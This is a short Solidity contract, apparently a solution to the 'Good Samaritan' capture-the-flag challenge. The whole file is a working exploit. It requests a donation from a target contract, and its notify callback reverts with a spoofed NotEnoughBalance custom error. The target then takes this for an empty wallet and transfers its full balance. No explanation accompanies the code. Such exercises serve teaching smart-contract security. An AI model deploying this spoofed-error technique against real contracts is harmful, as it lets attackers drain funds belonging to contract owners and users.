// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GoodSamaritan {
  function requestDonation() external returns(bool);
}
// Error to simulate (bubble up)
error NotEnoughBalance();

contract GoodSamaritanAttack {

  constructor() {
  }

  function attack(address target) external {
    GoodSamaritan(target).requestDonation();
  }

  function notify(uint256 amount_) external pure {
    if(amount_ <= 10) {
      revert NotEnoughBalance();
    }
  }
}
